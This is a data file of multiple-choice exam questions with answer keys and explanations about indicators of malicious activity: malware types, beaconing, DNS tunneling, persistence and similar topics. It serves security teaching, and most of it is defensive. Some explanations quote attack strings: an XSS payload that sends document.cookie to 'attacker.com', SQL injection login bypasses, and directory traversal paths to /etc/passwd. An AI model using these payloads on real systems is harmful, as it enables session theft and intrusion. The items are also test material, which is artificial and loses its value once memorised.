# Domain 2.0 - Threats, Vulnerabilities, and Mitigations
# Subdomain 2.4 - Indicators of Malicious Activity
# Format: question|answer_a|answer_b|answer_c|answer_d|correct_idx|explanation|domain|subdomain

What type of malware encrypts files and demands payment for decryption?|Trojan|Ransomware|Worm|Spyware|1|Ransomware encrypts victim's files or systems and demands payment (usually in cryptocurrency) for the decryption key. It's a major threat to organizations and individuals. Trojans disguise as legitimate software, worms self-replicate, and spyware steals information.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Which malware type appears legitimate but contains hidden malicious functionality?|Virus|Worm|Trojan|Rootkit|2|A Trojan (Trojan horse) disguises itself as legitimate software but contains hidden malicious functionality. Unlike viruses and worms, Trojans don't self-replicate. Viruses attach to files, worms spread independently, and rootkits hide other malware.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

What malware can self-replicate and spread across networks without user interaction?|Virus|Trojan|Worm|Logic bomb|2|Worms are self-replicating malware that spread across networks automatically without requiring user interaction or host files. Viruses require host files and user action, Trojans don't self-replicate, and logic bombs wait for triggers.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Which attack modifies DNS responses to redirect users to malicious websites?|ARP poisoning|DNS poisoning|IP spoofing|MAC flooding|1|DNS poisoning (DNS cache poisoning) modifies DNS responses to redirect users to malicious websites instead of legitimate ones. ARP poisoning targets network layer addressing, IP spoofing falsifies packet sources, and MAC flooding overwhelms switches.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

What attack intercepts and potentially modifies communications between two parties?|Replay attack|Man-in-the-middle (MitM)|DDoS|Spoofing|1|Man-in-the-middle (MitM) attacks intercept communications between two parties, allowing the attacker to eavesdrop and potentially modify messages. Replay attacks retransmit captured data, DDoS overwhelms systems, and spoofing impersonates entities.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Which attack floods a target with traffic from multiple sources to make it unavailable?|DoS|DDoS|Botnet|Amplification|1|Distributed Denial of Service (DDoS) attacks use multiple systems (often botnets) to flood a target with traffic, overwhelming it and making services unavailable. DoS comes from a single source, botnets are the tools used, and amplification is a DDoS technique.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

What type of malware records user keystrokes to steal credentials?|Spyware|Keylogger|Trojan|Rootkit|1|Keyloggers record keystrokes to capture passwords, credit card numbers, and other sensitive information. They're a type of spyware specifically focused on keyboard input. Spyware is broader, Trojans disguise themselves, and rootkits hide malware.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Which malware is designed to hide its presence and other malware from detection?|Virus|Worm|Rootkit|Adware|2|Rootkits are designed to hide their presence and conceal other malware from operating systems and security tools by operating at low system levels (kernel or boot level). Viruses and worms focus on spreading, and adware displays advertisements.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

What attack captures and retransmits authentication credentials or session tokens?|Man-in-the-middle|Replay attack|Session hijacking|Credential stuffing|1|Replay attacks capture valid authentication credentials or session tokens and retransmit them to gain unauthorized access. MitM intercepts live communications, session hijacking takes over active sessions, and credential stuffing uses stolen credentials from breaches.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Which indicator might suggest a system is compromised?|Regular updates installed|Unusual outbound network traffic|Normal CPU usage|Scheduled backups completing|1|Unusual outbound network traffic, especially to unknown or suspicious destinations, can indicate compromise as malware often communicates with command and control servers or exfiltrates data. Regular updates, normal CPU usage, and successful backups are positive indicators.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

What attack exploits the Address Resolution Protocol to associate an attacker's MAC address with another device's IP?|DNS poisoning|ARP poisoning|IP spoofing|MAC spoofing|1|ARP poisoning (ARP spoofing) exploits the Address Resolution Protocol to associate the attacker's MAC address with another device's IP address, redirecting traffic to the attacker. DNS poisoning targets name resolution, IP spoofing falsifies source IPs, and MAC spoofing changes MAC addresses.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Which malware changes its code structure with each iteration to avoid detection?|Static malware|Polymorphic malware|Metamorphic malware|Encrypted malware|1|Polymorphic malware changes its code structure, appearance, or encryption with each iteration while maintaining the same core functionality, making signature-based detection difficult. Static malware doesn't change, metamorphic completely rewrites itself, and encrypted malware may use consistent encryption.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

What type of malware remains memory-resident without writing files to disk?|Bloatware|Fileless malware|Logic bomb|Spyware|1|Fileless malware operates entirely in memory without writing traditional executable files to disk, making it extremely difficult to detect with conventional antivirus solutions. It leverages legitimate system tools like PowerShell, WMI, or Windows Management Instrumentation to execute malicious activities directly from RAM. Fileless attacks often exploit scripting languages and built-in operating system utilities, leaving minimal forensic evidence. They bypass file-based security controls and can persist through registry modifications or scheduled tasks rather than disk-based files. Common examples include PowerShell-based attacks, reflective DLL injection, and memory-only payloads. Bloatware is pre-installed unnecessary software, logic bombs activate on specific conditions, and spyware focuses on information theft rather than memory-only operation.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Pre-installed unnecessary software that consumes system resources on new devices is called what?|Adware|Bloatware|Spyware|Rootkit|1|Bloatware refers to pre-installed software on new devices that users didn't request and often don't need, consuming valuable system resources like CPU, memory, and storage. Manufacturers and vendors include bloatware for promotional purposes or revenue-sharing agreements, but it degrades device performance and startup times. Examples include trial versions of antivirus software, manufacturer utilities, browser toolbars, and promotional games. Bloatware can pose security risks if outdated and unpatched, create attack surface, and consume bandwidth with unwanted updates. Removal requires manual uninstallation or clean OS reinstallation. Adware displays advertisements, spyware steals information, and rootkits hide malicious activity rather than simply consuming resources.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Malicious code that activates only when specific conditions are met (like a date or event) is called what?|Time bomb|Logic bomb|Trojan|Backdoor|1|A logic bomb is malicious code embedded within legitimate software that remains dormant until specific conditions are met, such as a particular date (time bomb variant), deletion of a file, or removal of a user account. When triggered, logic bombs can delete critical files, corrupt databases, disable systems, or exfiltrate data. They're often planted by disgruntled insiders with programming access, making insider threat programs crucial for prevention. Famous examples include the 2006 UBS logic bomb that deleted 2,000 servers and the 2002 Fannie Mae case where a developer programmed a logic bomb to trigger after termination. Detection requires rigorous code reviews, access controls, separation of duties, and monitoring for unauthorized code changes. Time bombs are logic bombs triggered by dates/times specifically.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Multiple failed login attempts followed by account lockouts primarily indicate what type of attack?|SQL injection|Brute force attack|XSS attack|DNS poisoning|1|Multiple failed login attempts resulting in account lockouts are classic indicators of brute force attacks, where attackers systematically try numerous password combinations to gain unauthorized access. Modern variants include password spraying (trying common passwords across many accounts) and credential stuffing (using breached username-password pairs from other sites). Account lockout policies are primary defenses, typically locking accounts after 3-5 failed attempts for 15-30 minutes. However, attackers may intentionally trigger lockouts as denial-of-service against legitimate users. Indicators include: failed login attempts during non-business hours, attempts from unusual geographic locations, rapid sequential failures across multiple accounts, and attempts using default or common passwords. Multi-factor authentication (MFA) is the most effective countermeasure.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

A user's account shows logins from New York and Tokyo within 10 minutes. What indicator is this?|Session hijacking|Impossible travel|Concurrent sessions|Privilege escalation|1|Impossible travel occurs when a user account shows authentication from geographically distant locations within a timeframe that makes physical travel impossible (e.g., New York and Tokyo 10 minutes apart requires faster-than-airplane travel). This strongly indicates credential compromise, with possible causes including: stolen credentials used by multiple attackers, credential stuffing from breached databases, shared account abuse, or sophisticated attackers using VPNs/proxies to mask their true location. Organizations should: immediately suspend the account, force password reset, review account activity for unauthorized actions, check for data exfiltration, investigate how credentials were compromised, and implement geolocation-based conditional access policies. Modern identity providers like Azure AD automatically detect and alert on impossible travel. This differs from concurrent sessions (legitimate simultaneous logins) and session hijacking (taking over active session).|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

What type of attack uses a network of compromised computers to overwhelm a target?|Botnet|DDoS|Amplification|Reflection|1|A botnet is a network of compromised computers (zombies or bots) under centralized control, typically used to launch Distributed Denial of Service (DDoS) attacks by overwhelming targets with traffic from thousands or millions of infected devices. Botnets are created through malware infections via phishing, drive-by downloads, or exploiting vulnerabilities. Famous botnets include Mirai (2016, 600K IoT devices, 1Tbps attack), Emotet (banking trojan turned botnet), and ZeroAccess (cryptocurrency mining). Attackers rent botnet services on dark web for $5-50/hour. Botnets are also used for spam campaigns, credential stuffing, cryptocurrency mining, and click fraud. Detection involves monitoring for: unusual outbound traffic patterns, connections to known C2 servers, abnormal resource consumption, and behavioral anomalies. While DDoS is what botnets commonly do, the botnet itself is the infrastructure of compromised devices.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Regular communication from an internal system to an external server at fixed intervals indicates what?|Beaconing|Port scanning|ARP poisoning|SQL injection|0|Beaconing is periodic communication from a compromised system to an external command-and-control (C2) server, occurring at regular intervals (e.g., every 60 seconds, every 10 minutes) to check for new instructions, report status, or exfiltrate data. This behavior is characteristic of advanced persistent threats (APTs) and modern malware that maintains persistent access. Beaconing patterns to detect include: consistent time intervals between connections, communications to unusual domains or IPs, connections to newly registered domains, HTTPS connections to non-standard ports, and DNS queries with suspiciously long or encoded subdomains (DNS tunneling). Network monitoring tools like SIEM, NetFlow analysis, and behavioral analytics can identify beaconing by analyzing connection frequency, duration, and data volumes. Attackers use jitter (randomized intervals) and domain generation algorithms (DGAs) to evade detection. Blocking at firewall/proxy based on threat intelligence feeds is crucial.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Missing or deleted log files most likely indicate what?|System maintenance|Log rotation|Attacker covering tracks|Disk space cleanup|2|Missing or deleted log files are strong indicators that an attacker is covering their tracks after compromising a system. Attackers routinely delete or modify logs to remove evidence of: initial access methods, privilege escalation activities, lateral movement, data exfiltration, malware installation, and reconnaissance activities. Sophisticated attackers may selectively edit logs rather than deleting them entirely to avoid detection. The 2013 Target breach involved attackers deleting logs to hide 40GB of stolen credit card data. Defenses include: centralized log forwarding to SIEM (logs off the compromised system immediately), write-once storage or append-only log servers, log integrity monitoring with cryptographic hashing, alerting on logging service failures or suspicious gaps, and offline/cloud backup of critical logs. Windows Event Logs, syslog, application logs, and security tool logs are common targets. Legitimate log rotation is scheduled and documented, not sudden deletions.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Sudden spikes in network bandwidth usage during off-hours most likely indicate what?|Backup operations|System updates|Data exfiltration|User downloads|2|Sudden spikes in network bandwidth usage during non-business hours strongly suggest data exfiltration, where attackers transfer stolen data (intellectual property, customer data, financial records) to external systems. Attackers often operate during off-hours when: security teams are less vigilant, anomalous traffic is less likely to be noticed among normal business activity, network bandwidth is more available, and SIEM alert fatigue is lower. The 2021 Colonial Pipeline ransomware attack involved 100GB of data exfiltration before encryption. Indicators include: large outbound transfers to unknown destinations, unusual protocols or ports, connections to file-sharing services or cloud storage, DNS tunneling for covert channels, and compressed or encrypted traffic to evade DLP. Organizations should: baseline normal traffic patterns, implement egress filtering, monitor for large file transfers, use DLP solutions to detect sensitive data in transit, and alert on bandwidth anomalies. Legitimate backup operations and updates are scheduled and documented.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

A system repeatedly tries to access blocked websites or IP addresses. What does this indicate?|User error|Malware C2 communication|Software updates|DNS issues|1|Repeated attempts to access blocked websites or IP addresses often indicate malware attempting to communicate with command-and-control (C2) servers for instructions, updates, or data exfiltration. When initial C2 infrastructure is blocked (by firewalls, DNS filtering, or threat intelligence feeds), malware may cycle through backup C2 servers, use domain generation algorithms (DGAs) to create hundreds of potential domains, or attempt to tunnel through allowed protocols. Indicators include: connections to newly registered domains (often registered hours before use), attempts to reach domains with random-looking names (DGA patterns like "xjkf23klsdf.com"), HTTPS to unusual ports (8443, 4443), and failed DNS lookups for suspicious domains. The 2016 Mirai botnet used 1,000+ C2 domains. Organizations should: investigate the source system immediately, isolate it from the network, analyze running processes and network connections, check for persistence mechanisms (scheduled tasks, registry run keys), and perform forensic analysis to identify the malware family.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Antivirus software is disabled and cannot be re-enabled. What is the most likely cause?|Software conflict|Malware interference|License expiration|Corrupted installation|1|When antivirus software is disabled and cannot be re-enabled, the most likely cause is malware designed to neutralize security controls. Sophisticated malware families like Emotet, TrickBot, and ransomware variants specifically target antivirus processes by: killing AV processes, deleting AV files, modifying Windows registry to prevent AV startup, blocking access to security websites (av-update servers), exploiting vulnerabilities in AV software itself, and running with elevated privileges to override security settings. This is a critical indicator of compromise requiring immediate response: isolate the affected system from the network, boot into safe mode or use bootable antivirus tools (not relying on the compromised OS), perform offline malware scan, check for rootkits and kernel-mode malware, investigate how the malware gained administrative privileges, and reimage the system if rootkit/bootkit suspected. Organizations should implement: tamper protection features (Windows Defender Tamper Protection), application control policies (AppLocker), and EDR solutions that are harder to disable than traditional AV.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Users report sudden appearance of browser toolbars and pop-up advertisements. What is this?|Phishing|Adware|Ransomware|Rootkit|1|Adware is software that automatically displays or downloads advertising material (pop-ups, banners, toolbars) when a user is online. While often considered low-severity compared to other malware, adware can: degrade system performance, track browsing habits and personal information, redirect web searches to advertising sites, bundle with potentially unwanted programs (PUPs), and sometimes deliver more dangerous malware. Adware typically infects systems through: bundled software installations (users skip reading install prompts), malicious browser extensions, fake software updates, and drive-by downloads from compromised websites. The 2015 Superfish adware on Lenovo laptops intercepted HTTPS connections, creating massive security vulnerabilities. Removal requires: identifying and uninstalling suspicious programs, removing browser extensions, resetting browser settings, scanning with anti-malware tools, and checking for persistence mechanisms in startup programs and scheduled tasks. Prevention includes: downloading software only from official sources, reading installation prompts carefully, and using ad-blockers and script-blockers.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

New user accounts that nobody authorized appearing in Active Directory indicate what?|HR oversight|Persistence mechanism|License upgrade|Automated provisioning error|1|Unauthorized new user accounts in Active Directory are strong indicators of attacker persistence mechanisms, created to maintain long-term access even if the initial compromise is discovered. These accounts often have: administrative privileges for lateral movement and domain dominance, names designed to blend in (similar to legitimate service accounts like "sqlbackup" or "svc_monitoring"), passwords that don't expire, and group memberships that grant extensive access. The 2020 SolarWinds attack involved creating fake user accounts to blend with legitimate accounts. Attackers may also: create hidden accounts (prefixed with $ or special characters), add accounts to privileged groups (Domain Admins, Enterprise Admins), create accounts on local systems, and establish remote access capabilities. Detection strategies include: regular audits of user accounts (especially administrative), monitoring account creation events (Windows Event ID 4720), comparing current accounts against baseline/asset inventory, checking for accounts created during known compromise timeframes, and investigating accounts with suspicious naming patterns or creation dates. Automated identity governance helps prevent unauthorized account proliferation.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Memory usage steadily increasing without corresponding application activity suggests what?|Memory leak|Normal operation|Software update|User downloads|0|A memory leak occurs when a program allocates memory but fails to release it after use, causing memory consumption to steadily increase over time until the system runs out of RAM. While memory leaks are often programming bugs rather than intentional attacks, they can: degrade system performance progressively, cause applications to crash, trigger system instability, and create denial-of-service conditions. Memory leaks can be exploited maliciously as DoS attacks or may indicate: poorly written malware consuming resources, cryptocurrency mining malware, or memory-resident malware expanding its footprint. Signs include: increasing RAM usage without corresponding CPU or disk activity, system slowdown over hours or days, applications becoming unresponsive, and improvement only after restart. The Boeing 787 Dreamliner required rebooting every 248 days due to a memory counter overflow. Languages with manual memory management (C, C++) are more prone to leaks than garbage-collected languages (Java, Python, C#). Detection uses memory profilers and monitoring tools. Mitigation involves: identifying the leaking process, updating or restarting it, applying patches, and implementing RAII (Resource Acquisition Is Initialization) programming patterns.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Certificates being installed from untrusted Certificate Authorities indicates what?|Software updates|Man-in-the-middle attack|Normal IT operations|Browser update|1|Unexpected certificates from untrusted Certificate Authorities (CAs) strongly indicate man-in-the-middle (MitM) attacks, where attackers intercept encrypted HTTPS traffic by installing malicious root certificates that allow them to decrypt, inspect, and re-encrypt communications. This technique enables attackers to: steal credentials from "secure" websites, capture sensitive data from encrypted sessions, bypass SSL/TLS protections, inject malicious content into HTTPS traffic, and monitor all encrypted communications transparently. Common scenarios include: corporate SSL inspection tools (legitimate but should be known), malware installing rogue root CAs, compromised proxy servers, public WiFi captive portals, and state-sponsored surveillance. The 2011 DigiNotar breach resulted in fraudulent certificates used for surveillance in Iran. Users should: investigate unexpected certificate warnings, check installed root CAs (Windows certmgr.msc, Mac Keychain, Linux ca-certificates), remove unauthorized certificates, scan for malware, and avoid untrusted networks. Organizations should use certificate pinning, HSTS, and monitor certificate installation events.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Processes running under unusual user accounts (SYSTEM, Administrator) that normally wouldn't indicates what?|Privilege escalation|Scheduled task|System update|Backup operation|0|Processes running under highly privileged accounts (SYSTEM, Administrator, root) that don't normally require those privileges indicate privilege escalation, where attackers elevate their access from standard user to administrative rights. This is often a critical step in attack chains after initial compromise, enabling attackers to: install rootkits and kernel-mode malware, disable security software, create persistent backdoors, access all user data, modify system configurations, and move laterally to other systems. Common privilege escalation techniques include: exploiting unpatched vulnerabilities (Windows Print Spooler, Dirty COW on Linux), abusing misconfigured services running as SYSTEM, exploiting weak file permissions, DLL hijacking, token manipulation, and kernel exploits. Indicators include: unexpected processes running as SYSTEM or administrator, unusual child processes spawned by system processes, legitimate programs exhibiting unusual behavior with elevated privileges, and processes accessing resources they shouldn't need. Detection uses EDR tools, process monitoring, and behavioral analytics. Organizations should implement: least privilege principles, patch management, and application control.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Scheduled tasks created at unusual times or with suspicious names indicate what?|System maintenance|Persistence mechanism|Backup configuration|Software update|1|Suspicious scheduled tasks are common persistence mechanisms used by attackers to maintain access after compromise, automatically re-executing malware after reboots or at specified intervals. Windows Task Scheduler and Linux cron jobs are frequently abused because they: execute with specified privileges (often SYSTEM), run without user interaction, survive reboots, are legitimate OS features (appear less suspicious), and can trigger based on various conditions (time, user login, system boot). Indicators of malicious scheduled tasks include: creation times during known compromise periods, tasks running PowerShell or cmd.exe with obfuscated commands, tasks with misleading names (misspellings like "Micorsoft" or "Windwos"), tasks pointing to unusual file locations (%TEMP%, %APPDATA%, user directories), and tasks running under privileged accounts created by non-administrators. The Emotet malware extensively uses scheduled tasks for persistence. Investigation involves: reviewing all scheduled tasks (Windows Task Scheduler, Linux crontab), checking task creation timestamps, analyzing command lines and arguments, verifying digital signatures of executables, and correlating with other IOCs. Remove unauthorized tasks and investigate the source.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

A web server shows hundreds of 404 errors for paths like ../../etc/passwd. What attack is occurring?|SQL injection|Directory traversal|XSS|DDoS|1|Web server logs showing 404 errors for paths containing "../.." (dot-dot-slash) sequences accessing files like /etc/passwd, /windows/system32/config/sam, or /etc/shadow indicate directory traversal (path traversal) attacks. Attackers use these sequences to navigate outside the web root directory to access sensitive files, aiming to: read password files, access configuration files, view application source code, download database files, and identify system information. The "../" sequence moves up one directory level, so "../../../../etc/passwd" attempts to traverse up four levels then access the password file. Variations include: URL encoding (%2e%2e%2f), double encoding (%252e%252e%252f), Unicode encoding, and using backslashes on Windows (..\..\). While these 404 errors indicate unsuccessful attempts (web server blocked access), they're reconnaissance for vulnerabilities. Successful directory traversal results in 200 OK responses. Defenses include: input validation rejecting "../" patterns, chroot jails restricting file system access, principle of least privilege for web server processes, and web application firewalls (WAFs). Monitor for these patterns and investigate the source IPs.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Database logs showing queries with UNION SELECT and OR 1=1 statements indicate what?|Normal queries|SQL injection attack|Database optimization|Backup operation|1|Database logs containing queries with "UNION SELECT," "OR 1=1," "' OR '1'='1," or other suspicious SQL syntax are clear indicators of SQL injection attacks. Attackers inject malicious SQL code into application inputs to: extract sensitive data (usernames, passwords, credit cards, personal information), bypass authentication ("admin' OR '1'='1' --" to login without password), modify database contents, delete tables, and execute operating system commands on the database server. The UNION SELECT operator allows attackers to combine results from multiple queries, extracting data from tables they shouldn't access. The "1=1" condition is always true, bypassing WHERE clauses. Famous examples include the 2008 Heartland Payment Systems breach (130 million credit cards) and countless website defacements. Detection involves: reviewing database logs for suspicious patterns, monitoring error messages revealing database structure, analyzing abnormally long queries, checking for SQL keywords in input fields, and using database activity monitoring (DAM). Prevention requires: parameterized queries/prepared statements, input validation, least privilege database accounts, web application firewalls, and regular security testing.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Firewall logs showing outbound connections on ports 4444, 5555, or other unusual high ports indicate what?|Web browsing|Reverse shell|Email traffic|File transfer|1|Firewall logs showing outbound connections to unusual high-numbered ports (commonly 4444, 5555, 1337, 31337, 8888) often indicate reverse shell or backdoor communications. Unlike normal client-server models where clients initiate connections to well-known ports (80, 443, 25), reverse shells have the compromised internal system initiate outbound connections to attacker-controlled servers, bypassing ingress firewall rules that block inbound connections. Penetration testing tools like Metasploit use 4444 as the default port for reverse shells. Indicators include: connections to unusual destination IPs (residential ISPs, suspicious geolocations, newly registered domains), persistent connections maintained for long durations, data transfer patterns inconsistent with the port number, and connections originating from server systems that shouldn't initiate outbound connections. Attackers choose high ports because: they're less commonly filtered than privileged ports (0-1023), they avoid conflicting with legitimate services, and they're sometimes overlooked in firewall configurations. Organizations should: implement egress filtering, monitor outbound connections, block unnecessary outbound ports by default (whitelist approach), and investigate any unusual outbound traffic.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Registry modifications creating new Run keys or modifying service configurations indicate what?|Software installation|Persistence mechanism|System update|User preference|1|Windows Registry modifications creating or modifying Run keys and service configurations are classic persistence mechanisms allowing malware to automatically execute after system reboots. Critical registry locations for persistence include: HKLM\Software\Microsoft\Windows\CurrentVersion\Run (all users), HKCU\Software\Microsoft\Windows\CurrentVersion\Run (current user), HKLM\System\CurrentControlSet\Services (services), Winlogon keys (execute during login), and AppInit_DLLs (load into every process). These registry locations are so commonly abused that they're checked in every malware analysis. The registry offers attackers: automatic execution without user interaction, survival across reboots, ability to run with elevated privileges (SYSTEM), and appearance as legitimate system configuration. Detection involves: monitoring registry modification events (Sysmon Event ID 13), comparing current registry state against known-good baseline, checking autoruns (Sysinternals Autoruns tool), and investigating registry changes during known compromise timeframes. Legitimate software installations also modify registry, but malicious entries often have: suspicious file paths (%TEMP%, %APPDATA%), obfuscated commands, unsigned executables, or creation timestamps inconsistent with software installation. Organizations should implement registry monitoring and integrity checking.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Users receiving password reset emails they didn't request indicates what?|Phishing campaign|Account takeover attempt|System glitch|Marketing email|1|Users receiving unsolicited password reset emails strongly indicate account takeover attempts, where attackers who have obtained usernames (often through data breaches, OSINT, or email enumeration) attempt to reset passwords to gain access. This reconnaissance technique helps attackers: identify valid usernames (password reset forms often confirm if account exists), test account security (MFA enabled accounts are harder targets), prepare for targeted attacks, and potentially exploit weak password reset processes. The password reset emails themselves may be legitimate (from the actual service) or phishing emails designed to steal credentials. If legitimate, attackers are using the real password reset function; if phishing, attackers are impersonating the service to capture credentials. Users should: never click links in unsolicited password reset emails, navigate directly to the website instead, check for account access attempts in security logs, enable MFA immediately, review account recovery options (backup emails, phone numbers) for unauthorized changes, and report to IT security. Organizations should: monitor for spikes in password reset requests, implement CAPTCHA on reset forms, rate-limit reset attempts, and notify users through multiple channels for critical account changes.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

DNS queries with unusually long subdomains (50+ characters) or encoded data indicate what?|Normal DNS|DNS tunneling|DNS failure|DNSSEC|1|DNS queries with unusually long or encoded subdomains (e.g., "6d61bc704f.4a6c7de83b.2f8e9a1d5c.malicious-domain.com") indicate DNS tunneling, a covert channel technique for data exfiltration or C2 communication. DNS is often overlooked because it's essential for network operation, rarely filtered, and typically allowed through firewalls. Attackers encode data (stolen files, commands, encrypted communications) into DNS query subdomain labels, and the attacker-controlled authoritative DNS server extracts and reassembles the data. DNS tunneling tools include Iodine, DNSCat2, and commercial implants. Indicators include: DNS queries with unusually high entropy (random-looking subdomains), queries to suspicious or newly registered domains, unusual query types (TXT, NULL, CNAME), high volume of DNS queries from a single host, queries containing base64 or hex-encoded data, and queries significantly longer than typical DNS queries (legitimate average ~20 characters). The 2013 APT group Turla used DNS tunneling for C2. Defenses include: monitoring DNS query lengths and patterns, implementing DNS security tools, blocking known DNS tunneling domains, and using threat intelligence feeds. DNS should be centralized through controlled resolvers, not allowed directly outbound.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

PowerShell executing with encoded commands (EncodedCommand parameter) indicates what?|Normal administration|Obfuscated malicious script|Software deployment|System diagnostics|1|PowerShell executing with the -EncodedCommand (or -enc) parameter, especially with long base64-encoded strings, is a strong indicator of obfuscated malicious scripts attempting to evade detection. Attackers use encoded commands to: hide malicious intent from security tools, bypass command-line monitoring, evade signature-based detection, and execute complex scripts from single command lines. Base64 encoding converts readable PowerShell scripts into non-human-readable strings that decode and execute in memory. Fileless malware families like Emotet, TrickBot, and many ransomware variants extensively use encoded PowerShell. Indicators include: PowerShell launched by unusual parent processes (Office applications, browser plugins, scheduled tasks), commands with long base64 strings, network connections from PowerShell processes, and PowerShell downloading files from Internet. Organizations should: enable PowerShell script block logging (Event ID 4104 captures decoded commands), implement PowerShell Constrained Language Mode, use AppLocker or Windows Defender Application Control to restrict PowerShell execution, monitor for suspicious PowerShell process creation, and maintain PowerShell version 5+ with enhanced logging. While legitimate administrators occasionally use encoded commands, in malware context it's highly suspicious.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

A system clock repeatedly being reset or showing incorrect time indicates what?|Hardware failure|Anti-forensics technique|Time zone issue|BIOS battery|1|Repeated system clock resets or incorrect time settings can indicate anti-forensics techniques used by attackers to: disrupt log timestamps and forensic timelines, invalidate digital certificates (MitM attacks), bypass time-based license checks, evade time-based security controls (scheduled scans, updates), and confuse incident response investigations. Accurate timestamps are crucial for: correlating events across systems, establishing attack timelines, forensic analysis, legal proceedings, and compliance requirements. Malware like Emotet and ransomware variants modify system time to: make logs appear from different time periods, create gaps in monitoring, prevent time-based detection signatures from matching, and disrupt NTP synchronization. However, clock issues can also indicate: dying CMOS battery, malware, GPS jamming affecting time sources, or NTP server problems. Investigation should: check system time against known-good sources, review time change events (Windows Event ID 1), examine processes with SeSystemTimePrivilege, verify NTP configuration, and correlate with other indicators of compromise. Organizations should: synchronize all systems with trusted NTP sources, monitor for time changes, restrict privileges to change system time, and use hardware security modules (HSMs) with tamper-evident clocks for critical systems.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Web requests with <script> tags, JavaScript code, or HTML in form inputs indicate what?|Normal input|Cross-site scripting attack|SQL injection|CSRF|1|Web requests containing <script> tags, JavaScript code, or HTML markup in form inputs, URL parameters, or headers indicate Cross-Site Scripting (XSS) attacks. Attackers inject malicious scripts into web applications that other users' browsers execute, enabling: session cookie theft (document.cookie), credential harvesting via fake login forms, website defacement, browser exploitation, keylogging, redirecting users to malicious sites, and conducting phishing attacks within the legitimate website's context. XSS comes in three types: Reflected (script in URL parameter immediately returned), Stored (script saved in database, affects all users viewing it), and DOM-based (client-side JavaScript manipulation). Examples of malicious payloads include: <script>document.location='http://attacker.com/?c='+document.cookie</script> to steal cookies, <img src=x onerror="malicious_code"> for obfuscation, and <iframe src="malicious-site"> for clickjacking. The 2018 British Airways breach involved Magecart XSS stealing 380,000 payment cards. Web application firewalls detect XSS patterns in logs. Prevention requires: input validation rejecting special characters, output encoding (htmlspecialchars), Content Security Policy headers, HttpOnly cookie flags, and regular security testing.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Sudden increase in outbound SMTP traffic from a server that isn't a mail server indicates what?|Legitimate email|Spam botnet activity|Email backup|User error|1|Sudden increases in outbound SMTP (Simple Mail Transfer Protocol, port 25/587) traffic from servers that aren't designated mail servers strongly indicate spam botnet activity or malware spreading via email. Compromised systems are used to: send spam campaigns (millions of emails), distribute malware via email attachments, conduct phishing campaigns, and relay email to hide the true source. Using compromised systems rather than attacker infrastructure makes: emails appear from legitimate IP addresses, blocklists less effective, and attribution more difficult. The Emotet malware botnet sent millions of emails daily before its 2021 takedown. Indicators include: thousands of outbound SMTP connections, connections to residential or suspicious mail servers, messages with suspicious attachments or links, emails sent outside business hours, and sudden spikes in bandwidth usage. Organizations should: monitor all outbound SMTP traffic, block outbound SMTP except from authorized mail servers (egress filtering), implement SMTP authentication, check internal systems against spam blacklists, and investigate any system initiating outbound email traffic. Legitimate email should flow through centralized, monitored mail servers with proper SPF/DKIM/DMARC configuration. Compromised systems should be isolated and reimaged.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

